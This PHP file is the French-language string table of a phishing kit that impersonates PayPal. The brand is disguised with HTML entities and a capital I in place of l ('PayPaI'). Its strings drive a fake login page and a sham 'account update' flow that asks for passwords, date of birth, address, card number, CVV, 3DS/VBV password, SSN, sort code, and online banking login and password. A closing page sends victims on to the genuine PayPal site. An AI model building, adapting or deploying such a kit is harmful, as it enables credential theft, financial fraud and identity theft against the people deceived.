<?php 
//LOG
$log_ttl1="&#80;&#97;y&#80;&#97;I compte mettre à jour";
$log_ttl2="Assurer";
$log_lab1="&#80;&#97;y&#80;&#97;I Page Sécurisée";
$log_lab2="Connectez-vous à votre compte";
$log_em="Adresse email";
$log_ps="Mot de passe";
$log_frg="Vous avez oublié votre adresse email ou votre mot de passe&nbsp;?";
$log_btn="Connexion";
//FTR
$ftr_01="Respect de la vie privée";
$ftr_02="Juridique";
$ftr_03="Contact";
$ftr_04="Évaluation";
//INF
$inf_scr="Votre sécurité est notre priorité";
$inf_ttspan="Mise à jour des informations de compte";
$inf_lab1="Mise à jour de vos informations";
$inf_corr="veuillez entrer correctement les informations requises.";
$inf_frnm="Votre prénom";
$inf_lsnm="Votre nom de famille";
$inf_dob="Date de naissance MM/JJ/AAAA";
$inf_add="Ligne d'adresse";
$inf_cty="Ville";
$inf_stt="État/Province/Région";
$inf_cnt="Nationalité";
$inf_zip="Code postal";
$inf_mob="Mobile";
$inf_hom="Maison";
$inf_pho="Votre numéro de téléphone";
$inf_con="Continuer";
//CRD
$crd_ttspan="Mise à jour de la carte";
$crd_lab1="Mise à jour Carte de Crédit/Débit";
$crd_corr="veuillez entrer correctement les informations requises.";
$crd_crdh="Titulaire de la carte";
$crd_crdn="Entrez votre numéro de carte";
$crd_expd="Date d'expiration MM/AA";
$crd_cv="Cryptogramme";
$crd_ttcv="Entrez votre vérification carte de code affiché sur votre carte";
$crd_ptcv="./scr/csc";
$crd_wtcv="Où trouver le Cryptogramme visuel ?";
$crd_ttptcv="Cryptogramme - Aide";
$crd_cvp="Le CVV (ou valeur de vérification de la carte) est un élément de sécurité antifraude qui permet de vérifier si la carte de crédit est en votre possession. Pour les cartes Visa/Mastercard, le numéro CVV de trois chiffres est imprimé sur la plage de signature, au dos de la carte, à la suite du numéro de compte. Pour la carte American Express, le numéro CVV de quatre chiffres est imprimé sur le devant de la carte au-dessus du numéro de compte.";
$crd_cvtd1="Il s'agit d'un numéro de 3 chiffres en italique inversé au dos de la carte de crédit.";
$crd_cvtd2="Il s'agit d'un numéro de 4 chiffres sur le devant de la carte, juste au-dessus du numéro de carte de crédit.";
$crd_cvfrm="Fermer";
$crd_pcptcv="../../imcs_files/cvf.png";
$crd_3ds="3DS/VBV Mot de pass";
$crd_acc="Numéro de compte";
$crd_sn="SSN";
$crd_ttsn="Numéro de sécurité sociale";
$crd_srt="Sort code";
$crd_ttptsrt="Sort code - Help";
$crd_ptsrt="./scr/srt/";
$crd_pcsrt="../../imcs_files/srt.png";
$crd_btn="Continue";
//BNK
$bnk_ttspan="Banque d'information Mise à jour";
$bnk_lab1="Mettre à jour votre compte bancaire";
$bnk_yrbn="Votre nom de la banque:";
$bnk_corr="veuillez entrer correctement les informations requises.";
$bnk_id="Banque utilisateur/ID";
$bnk_ps="Mot de passe bancaire";
$bnk_rt="Nombre de routage";
$bnk_bt="Enregistrer";
//SCS
$scs_ttspan="Mise à jour succès";
$scs_lnk="https://www.paypal.com/signin/?country.x=FR&locale.x=fr_FR";
$scs_tnk="Merci";
$scs_yrp="Votre Compte PayPaI a été correctement Mis à Jour.";
$scs_yhv="Pour enregistrer les modification,veuillez patienter 3 secondes pour la redirection vers la page de commexion ... Merci d'utiliser notre systéme de vérification.";
?>